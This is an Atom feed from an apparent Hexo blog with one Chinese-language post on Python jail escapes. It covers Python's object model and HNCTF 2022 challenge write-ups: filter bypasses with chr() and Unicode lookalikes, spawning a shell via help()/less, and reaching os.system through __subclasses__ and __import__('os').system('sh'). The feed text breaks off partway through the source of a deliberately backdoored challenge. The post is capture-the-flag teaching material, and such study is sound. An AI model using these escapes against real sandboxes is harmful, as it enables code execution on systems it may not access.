<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-13T14:15:45.421Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PyJail</title>
    <link href="http://example.com/2024/05/06/PyJail/"/>
    <id>http://example.com/2024/05/06/PyJail/</id>
    <published>2024-05-06T14:42:33.000Z</published>
    <updated>2024-05-13T14:15:45.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pyjail"><a class="markdownIt-Anchor" href="#pyjail">#</a> PyJail</h1><h2 id="pythonçš„ä¸€äº›ç‰¹æ€§"><a class="markdownIt-Anchor" href="#pythonçš„ä¸€äº›ç‰¹æ€§">#</a> Python çš„ä¸€äº›ç‰¹æ€§</h2><h3 id="objectç±»çš„ç»§æ‰¿"><a class="markdownIt-Anchor" href="#objectç±»çš„ç»§æ‰¿">#</a> object ç±»çš„ç»§æ‰¿</h3><p><code>Python3.x</code>  ç‰ˆæœ¬ä¸­ï¼Œç±»é»˜è®¤ä¼šç»§æ‰¿ <code>object</code></p><p>ä½†åœ¨ <code>Python2.x</code>  ä¸­ï¼Œé»˜è®¤ä¸ä¼šç»§æ‰¿</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ä¸å¸¦object</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&quot;zhengtong&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å¸¦æœ‰object</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&quot;chonghong&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    x = Person()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Person&quot;</span>, <span class="built_in">dir</span>(x)</span><br><span class="line"> </span><br><span class="line">    y = Animal()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Animal&quot;</span>, <span class="built_in">dir</span>(y)</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œç»“æœï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person [&#x27;__doc__&#x27;, &#x27;__module__&#x27;, &#x27;name&#x27;]</span><br><span class="line">Animal [&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__doc__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, </span><br><span class="line">&#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__module__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, </span><br><span class="line">&#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;name&#x27;]</span><br></pre></td></tr></table></figure></div><h3 id="pythonä¸­ç±»æœ¬èº«å…·æœ‰ä¸€äº›é™æ€æ–¹æ³•"><a class="markdownIt-Anchor" href="#pythonä¸­ç±»æœ¬èº«å…·æœ‰ä¸€äº›é™æ€æ–¹æ³•">#</a> python ä¸­ç±»æœ¬èº«å…·æœ‰ä¸€äº›é™æ€æ–¹æ³•</h3><p>å¦‚ <code>bytes.fromhex</code> ã€ <code>int.from_bytes</code>  ç­‰ã€‚å¯¹äºè¿™äº›ç±»çš„å®ä¾‹ï¼Œä¹Ÿèƒ½è°ƒç”¨è¿™äº›é™æ€æ–¹æ³•ã€‚å¦‚ <code>b'1'.fromhex('1234')</code> ï¼Œè¿”å› <code>b'\x124'</code> ã€‚ï¼ˆä¸€ä¸ªç‰¹æ®Šçš„ä¾‹å­æ˜¯æ•´æ•°å¸¸é‡ä¸æ”¯æŒè¿™æ ·æ“ä½œï¼Œå¦‚è¾“å…¥ <code>3.from_bytes</code>  ä¼šæŠ¥é”™ï¼‰</p><h3 id="pythoné­”æœ¯æ–¹æ³•"><a class="markdownIt-Anchor" href="#pythoné­”æœ¯æ–¹æ³•">#</a> Python é­”æœ¯æ–¹æ³•</h3><ul><li><p><code>__init__</code> ï¼šæ„é€ å‡½æ•°ã€‚è¿™ä¸ªåœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™å°±ä¼šç”¨åˆ°ï¼Œä¸€èˆ¬æ˜¯æ¥å—ç±»åˆå§‹åŒ–çš„å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œã€‚</p></li><li><p><code>__len__</code> ï¼šè¿”å›å¯¹è±¡çš„é•¿åº¦ã€‚å¯¹ä¸€ä¸ªå¯¹è±¡ <code>a</code>  ä½¿ç”¨ <code>len(a)</code>  æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨ <code>a.__len__()</code> ã€‚ä¾‹å¦‚è¦é€šè¿‡ç»§æ‰¿ <code>torch.utils.data.Dataset</code>  æ¥å®ç°è‡ªå·±çš„æ•°æ®é›†æ—¶ï¼Œå°±éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼›</p></li><li><p><code>__str__</code> ï¼šè¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚å¯¹ä¸€ä¸ªå¯¹è±¡ <code>a</code>  ä½¿ç”¨ <code>str(a)</code>  æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨ <code>a.__str__()</code> ã€‚è¿™åœ¨æˆ‘ä»¬è‡ªå·±å®ç°ä¸€äº›ç±»ï¼Œè­¬å¦‚å¤æ•°ã€äºŒå‰æ ‘ã€æœ‰é™åŸŸã€æ¤­åœ†æ›²çº¿ç­‰æ—¶ï¼Œé€šè¿‡å®ç°è¯¥æ–¹æ³•ï¼Œèƒ½å°†å¯¹è±¡çš„å†…å®¹è¾ƒå¥½åœ°æ‰“å°å‡ºæ¥ã€‚ï¼ˆ <code>print</code>  å‡½æ•°ä¸­ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„ <code>__str__</code> æ–¹æ³•ï¼‰ç›¸ä¼¼åœ°ï¼Œè¿˜æœ‰ <code>__int__</code> é­”æœ¯æ–¹æ³•ä¹Ÿç”¨äºç±»å‹è½¬æ¢ï¼Œä¸è¿‡è¾ƒå°‘ä½¿ç”¨ï¼›</p></li><li><p><code>__getitem__</code> ï¼šæ ¹æ®ç´¢å¼•è¿”å›å¯¹è±¡çš„æŸä¸ªå…ƒç´ ã€‚å¯¹ä¸€ä¸ªå¯¹è±¡ <code>a</code>  ä½¿ç”¨ <code>a[1]</code>  æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨ <code>a.__getitem__(1)</code> ã€‚åŒæ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ç»§æ‰¿ <code>torch.utils.data.Dataset</code>  æ¥å®ç°è‡ªå·±çš„æ•°æ®é›†æ—¶ï¼Œå°±éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ã€‚æœ‰ <code>__getitem__</code> ï¼Œè‡ªç„¶ä¹Ÿæœ‰å¯¹åº”çš„ <code>__setitem__</code> ï¼›</p></li><li><p><code>__add__</code> ã€ <code>__sub__</code> ã€ <code>__mul__</code> ã€ <code>__div__</code> ã€ <code>__mod__</code> ï¼šç®—æœ¯è¿ç®—ï¼ŒåŠ å‡ä¹˜é™¤æ¨¡ã€‚å¦‚å¯¹ä¸€ä¸ªå¯¹è±¡ <code>a</code>  ä½¿ç”¨ <code>a+b</code>  æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨ <code>a.__add__(b)</code> ã€‚ç›¸åº”åœ°ï¼Œå¯¹äºæœ‰äº›è¿ç®—ï¼Œå¯¹è±¡éœ€æ”¾åœ¨åé¢ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰çš„ï¼Œåˆ™éœ€å®ç° <code>__radd__</code> ã€ <code>__rsub__</code> ã€ <code>__rmul__</code> ã€ <code>__rdiv__</code> ã€ <code>__rmod__</code> ï¼Œå¦‚æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹çš„å€ç‚¹è¿ç®— <code>G -&gt; d * G</code> ï¼Œå°±å¯ä»¥é€šè¿‡å®ç° <code>__rmul__</code> æ¥å®ç°ã€‚</p></li><li><p><code>__and__</code> ï¼Œ <code>__or__</code> ã€ <code>__xor__</code> ï¼šé€»è¾‘è¿ç®—ï¼Œå’Œç®—æœ¯è¿ç®—ç±»ä¼¼ï¼›</p></li><li><p><code>__eq__</code> ï¼Œ <code>__ne__</code> ã€ <code>__lt__</code> ã€ <code>__gt__</code> ã€ <code>__le__</code> ã€ <code>__ge__</code> ï¼šæ¯”è¾ƒè¿ç®—ï¼Œå’Œç®—æœ¯è¿ç®—ç±»ä¼¼ï¼›ä¾‹å¦‚ <code>'è´µå·' &gt; 'å¹¿è¥¿'</code> ï¼Œå°±ä¼šè½¬è€Œè°ƒç”¨ <code>'è´µå·'.__gt__('å¹¿è¥¿')</code> ï¼›æŒ‰é¡ºåºåˆ†åˆ«æ˜¯ <code>==</code> , <code>!=</code> , <code>&lt;</code> , <code>&gt;</code> , <code>&lt;=</code> , <code>&gt;=</code></p></li><li><p><code>__getattr__</code> ï¼šè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘ã€‚å¦‚æœæˆ‘ä»¬å¯¹å¯¹è±¡ <code>a</code>  æ‰€å¯¹åº”çš„ç±»å®ç°äº†è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨æœªå®ç°çš„ <code>a.b</code>  æ—¶ï¼Œå°±ä¼šè½¬è€Œè°ƒç”¨ <code>a.__getattr__(b)</code> ã€‚è¿™ä¹Ÿç­‰ä»·äºç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ï¼š <code>getattr(a, 'b')</code> ã€‚æœ‰ <code>__getattr__</code> ï¼Œè‡ªç„¶ä¹Ÿæœ‰å¯¹åº”çš„ <code>__setattr__</code> ï¼›</p></li><li><p><code>__setattr__</code> ï¼šåœ¨å¯¹ä¸€ä¸ªå±æ€§è®¾ç½®å€¼çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°</p></li><li><p><code>__subclasses__</code> ï¼šè¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»ã€‚ä¸€èˆ¬æ˜¯ç”¨åœ¨ <code>object</code>  ç±»ä¸­ï¼Œåœ¨ <code>object.__subclasses__()</code>  ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ° <code>os</code>  æ¨¡å—ä¸­çš„ç±»ï¼Œç„¶åå†æ‰¾åˆ° <code>os</code> ï¼Œå¹¶ä¸”æ‰§è¡Œ <code>os.system</code> ï¼Œå®ç° RCEã€‚</p></li><li><p>ç›¸å¯¹åº”åœ°ï¼Œpython çš„ç±»ä¸­ä¹ŸåŒ…å«ç€ä¸€äº›é­”æœ¯å±æ€§ï¼š</p></li></ul><ul><li><code>__dict__</code> ï¼šå¯ä»¥æŸ¥çœ‹å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ã€‚è­¬å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š</li></ul><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KFCCrazyThursday</span>:</span><br><span class="line">    vivo = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(KFCCrazyThursday.__dict__)</span><br></pre></td></tr></table></figure></div><p>å°±èƒ½çœ‹åˆ°å­—å…¸ä¸­åŒ…å« <code>'vivo': 50</code>  çš„é”®å€¼å¯¹ã€‚æ³¨æ„åœ¨ python ä¸­ï¼Œ <code>dict()</code>  æ˜¯å°†ç±»è½¬æˆå­—å…¸çš„å‡½æ•°ï¼Œè·Ÿæ­¤é­”æœ¯å±æ€§æ— å…³ã€‚</p><ul><li><p><code>__doc__</code> ï¼šç±»çš„å¸®åŠ©æ–‡æ¡£ã€‚é»˜è®¤ç±»å‡æœ‰å¸®åŠ©æ–‡æ¡£ã€‚å¯¹äºè‡ªå®šä¹‰çš„ç±»ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å®ç°ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KFCCrazyThursday</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I&#x27;m not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    vivo = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(KFCCrazyThursday.__doc__)</span><br></pre></td></tr></table></figure></div><p>å°±ä¼šæ‰“å°ä¸Šé¢çš„æ–‡æ¡£ï¼›</p><ul><li><code>__class__</code> ï¼šè¿”å›å½“å‰å¯¹è±¡æ‰€å±çš„ç±»ã€‚å¦‚ <code>''.__class__</code> ä¼šè¿”å› <code>&lt;class 'str'&gt;</code> ã€‚æ‹¿åˆ°ç±»ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆæ–°çš„å¯¹è±¡ï¼Œå¦‚ <code>''.__class__(4396)</code> ï¼Œå°±ç­‰ä»·äº <code>str(4396)</code> ï¼Œå³ <code>'4396'</code> ï¼›</li><li><code>__base__</code> ï¼šè¿”å›å½“å‰ç±»çš„åŸºç±»ã€‚å¦‚ <code>str.__base__</code> ä¼šè¿”å› <code>&lt;class 'object'&gt;</code> ï¼›</li></ul></li></ul><h3 id="ä¸€äº›é‡è¦çš„å†…ç½®å‡½æ•°å’Œå˜é‡"><a class="markdownIt-Anchor" href="#ä¸€äº›é‡è¦çš„å†…ç½®å‡½æ•°å’Œå˜é‡">#</a> ä¸€äº›é‡è¦çš„å†…ç½®å‡½æ•°å’Œå˜é‡ï¼š</h3><ul><li><code>dir</code> ï¼šæŸ¥çœ‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚åœ¨æˆ‘ä»¬æ²¡æœ‰æ€è·¯çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯¥å‡½æ•°æŸ¥çœ‹æ‰€æœ‰å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•ï¼›æ­¤å¤–ï¼Œåœ¨é¢˜ç›®ç¦ç”¨å¼•å·ä»¥åŠå°æ•°ç‚¹æ—¶ï¼Œä¹Ÿå¯ä»¥å…ˆç”¨æ‹¿åˆ°ç±»æ‰€æœ‰å¯ç”¨æ–¹æ³•ï¼Œå†ç´¢å¼•åˆ°æ–¹æ³•åï¼Œå¹¶ä¸”é€šè¿‡ <code>getattr</code>  æ¥æ‹¿åˆ°ç›®æ ‡æ–¹æ³•ã€‚</li><li><code>chr</code> ã€ <code>ord</code> ï¼šå­—ç¬¦ä¸ ASCII ç è½¬æ¢å‡½æ•°ï¼Œèƒ½å¸®æˆ‘ä»¬ç»•è¿‡ä¸€äº› WAF</li><li><code>globals</code> ï¼šè¿”å›æ‰€æœ‰å…¨å±€å˜é‡çš„å‡½æ•°ï¼›</li><li><code>locals</code> ï¼šè¿”å›æ‰€æœ‰å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼›</li><li><code>__import__</code> ï¼šè½½å…¥æ¨¡å—çš„å‡½æ•°ã€‚ä¾‹å¦‚ <code>import os</code>  ç­‰ä»·äº <code>os = __import__('os')</code> ï¼›</li><li><code>__name__</code> ï¼šè¯¥å˜é‡æŒ‡ç¤ºå½“å‰è¿è¡Œç¯å¢ƒä½äºå“ªä¸ªæ¨¡å—ä¸­ã€‚å¦‚æˆ‘ä»¬ python ä¸€èˆ¬å†™çš„ <code>if __name__ == '__main__':</code> ï¼Œå°±æ˜¯æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ç›´æ¥è¿è¡Œè¯¥è„šæœ¬ã€‚å¦‚æœæ˜¯ä»å¦å¤–çš„åœ°æ–¹ import çš„è¯¥è„šæœ¬çš„è¯ï¼Œé‚£ <code>__name__</code> å°±ä¸ä¸º <code>__main__</code> ï¼Œå°±ä¸ä¼šæ‰§è¡Œä¹‹åçš„ä»£ç ã€‚æ›´å¤šå‚è€ƒ<a class="link" href="https://link.zhihu.com/?target=https%3A//www.geeksforgeeks.org/__name__-a-special-variable-in-python/">è¿™é‡Œ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼›</li><li><code>__builtins__</code> ï¼šåŒ…å«å½“å‰è¿è¡Œç¯å¢ƒä¸­é»˜è®¤çš„æ‰€æœ‰å‡½æ•°ä¸ç±»ã€‚å¦‚ä¸Šé¢æ‰€ä»‹ç»çš„æ‰€æœ‰é»˜è®¤å‡½æ•°ï¼Œå¦‚ <code>str</code> ã€ <code>chr</code> ã€ <code>ord</code> ã€ <code>dict</code> ã€ <code>dir</code>  ç­‰ã€‚åœ¨ pyjail çš„æ²™ç®±ä¸­ï¼Œå¾€å¾€ <code>__builtins__</code> è¢«ç½®ä¸º <code>None</code> ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨ä¸Šè¿°çš„å‡½æ•°ã€‚æ‰€ä»¥ä¸€ç§æ€è·¯å°±æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç±»çš„åŸºç±»å’Œå­ç±»æ‹¿åˆ° <code>__builtins__</code> ï¼Œå† <code>__import__('os').system('sh')</code>  è¿›è¡Œ RCEï¼›</li><li><code>__file__</code> ï¼šè¯¥å˜é‡æŒ‡ç¤ºå½“å‰è¿è¡Œä»£ç æ‰€åœ¨è·¯å¾„ã€‚å¦‚ <code>open(__file__).read()</code>  å°±æ˜¯è¯»å–å½“å‰è¿è¡Œçš„ python æ–‡ä»¶ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>è¯¥å˜é‡ä»…åœ¨è¿è¡Œä»£ç æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿï¼Œåœ¨è¿è¡Œäº¤äº’å¼ç»ˆç«¯æ—¶ä¸ä¼šæœ‰æ­¤å˜é‡</strong>ï¼›</li><li><code>_</code> ï¼šè¯¥å˜é‡è¿”å›ä¸Šä¸€æ¬¡è¿è¡Œçš„ python è¯­å¥ç»“æœã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>è¯¥å˜é‡ä»…åœ¨è¿è¡Œäº¤äº’å¼ç»ˆç«¯æ—¶ä¼šäº§ç”Ÿï¼Œåœ¨è¿è¡Œä»£ç æ–‡ä»¶æ—¶ä¸ä¼šæœ‰æ­¤å˜é‡</strong>ã€‚</li></ul><h2 id="hnctf-2022-jail"><a class="markdownIt-Anchor" href="#hnctf-2022-jail">#</a> HNCTF 2022 Jail</h2><h3 id="calc_jail_beginner"><a class="markdownIt-Anchor" href="#calc_jail_beginner">#</a> calc_jail_beginner</h3><p>æºç </p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/krREqKi1.png" alt="1715085559866.png"></p><p>æ³¨é‡Šå†™ç€ç­”æ¡ˆ</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/DCydnhAo.png" alt="1715079686139.png"></p><h3 id="calc_jail_beginner_level1"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level1">#</a> calc_jail_beginner_level1</h3><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/IQ2CmUzY.png" alt="1715085567940.png"></p><p>ç»è¿‡è¯•é”™å¯ä»¥å‘ç°æ—¶ <code>flag</code>  å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ <code>chr()</code>  ç»•è¿‡</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/pZ9UlBeb.png" alt="1715085345824.png"></p><h3 id="calc_jail_beginner_level2"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level2">#</a> calc_jail_beginner_level2</h3><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/8sOZtPla.png" alt="1715085670839.png"></p><p>é•¿åº¦é™åˆ¶ 13 ä¸ªå­—ç¬¦</p><p><code>eval(input())</code>  å°±ä¸ä¼šé™åˆ¶é•¿åº¦äº†</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/yH3VnYJMhdu9KDz.png" alt="image.png"></p><h3 id="calc_jail_beginner_level25"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level25">#</a> calc_jail_beginner_level2.5</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/qd2CRjgS5LtiFXu.png" alt="image.png"></p><p>è¯•é”™ä¹‹åå‘ç° ban äº† <code>eval,input,exec</code></p><p>å¯ä»¥ä½¿ç”¨ unicode æ³¨å…¥   <code>ğ“®val(inpğ“¾t())</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/N4H5DVwTt1u6MxP.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥ç”¨ <code>breakpoint()</code> , ä¸€ä¸ªè°ƒè¯•å‡½æ•°ï¼Œæ‰§è¡Œåå¯ä»¥æ‰§è¡Œä¸€äº›å‘½ä»¤ä¸è¢«ç»•è¿‡</p><h3 id="calc_jail_beginner_level3"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level3">#</a> calc_jail_beginner_level3</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/Q2eFRdN1KWETXDx.png" alt="image.png"></p><p>é™åˆ¶åªæœ‰ 7 ä¸ªå­—ç¬¦</p><p>1ã€è¾“å…¥ï¼šhelp ()ï¼Œè¿™é‡Œå­—ç¬¦ä¸²é•¿åº¦åªæœ‰ 6ï¼Œä¼šè¿›å…¥æ­£å¸¸è°ƒç”¨ eval å‡½æ•°ï¼›</p><p>2ã€è¿›å…¥ help äº¤äº’å¼ï¼Œç„¶åè¾“å…¥ä»»æ„ä¸€ä¸ªæ¨¡å—åè·å¾—è¯¥æ¨¡å—çš„å¸®åŠ©æ–‡æ¡£ï¼Œå¦‚ sysï¼›</p><p>3ã€åœ¨ Linux ä¸­ï¼Œè¿™é‡Œå‘ˆç°å¸®åŠ©æ–‡æ¡£æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†ç³»ç»Ÿé‡Œçš„ less æˆ– more å‘½ä»¤ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¿©ä¸ªå‘½ä»¤æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„ç‰¹æ€§æ¥è·å–ä¸€ä¸ª shellï¼Œç»§ç»­æŒ‰ #!ï¼Œå†æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ sh å³å¯ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/otudEJ38IMCNkge.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/U39Xhjc4THxE8nl.png" alt="image.png"></p><h3 id="python2-input"><a class="markdownIt-Anchor" href="#python2-input">#</a> python2 input</h3><p>è¿™æ˜¯ä¸€ä¸ª python2 çš„ jail</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/Z4FIetBKj6Q7yzR.png" alt="image.png"></p><p>å› ä¸ºä¸Šé¢æåˆ°çš„åœ¨ python2 ç±»ä¸­é»˜è®¤ä¸ç»§æ‰¿ object ç±»ï¼Œéœ€è¦æ„é€  <code>import</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/jcY48uqdnxaOB7L.png" alt="image.png"></p><h3 id="lake-lake-lake"><a class="markdownIt-Anchor" href="#lake-lake-lake">#</a> lake lake lake</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     